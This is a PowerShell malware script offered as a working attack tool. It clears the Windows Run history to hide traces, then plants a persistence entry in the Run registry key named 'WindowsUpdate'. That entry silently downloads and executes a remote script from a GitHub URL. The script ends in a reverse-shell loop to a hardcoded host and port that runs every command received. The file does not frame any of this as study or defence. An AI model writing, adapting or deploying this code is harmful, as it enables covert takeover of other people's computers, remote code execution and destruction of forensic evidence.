# 1. DELAY UNTIL NETWORK IS READY
while (!(Test-Connection 8.8.8.8 -Count 1 -Quiet)) { Start-Sleep -Seconds 5 }

# 2. CLEANUP RUN HISTORY (Anti-Forensics)
$HistoryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-ItemProperty -Path $HistoryPath -Name "*" -ErrorAction SilentlyContinue

# 3. RE-ESTABLISH PERSISTENCE (Ensures it stays hidden)
$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Name = "WindowsUpdate"
# This command launches a hidden process inside a hidden process
$Value = "powershell.exe -WindowStyle Hidden -Args '-NoP -w 1 -c `"IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1'')`""
Set-ItemProperty -Path $Path -Name $Name -Value $Value

# 4. THE BEACON LOOP
$LHOST = "192.168.43.109"
$LPORT = 4444

while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- STEALTH SYSTEM CONNECTED ---")
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if($line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 15 # Wait 15s to retry
    }
}
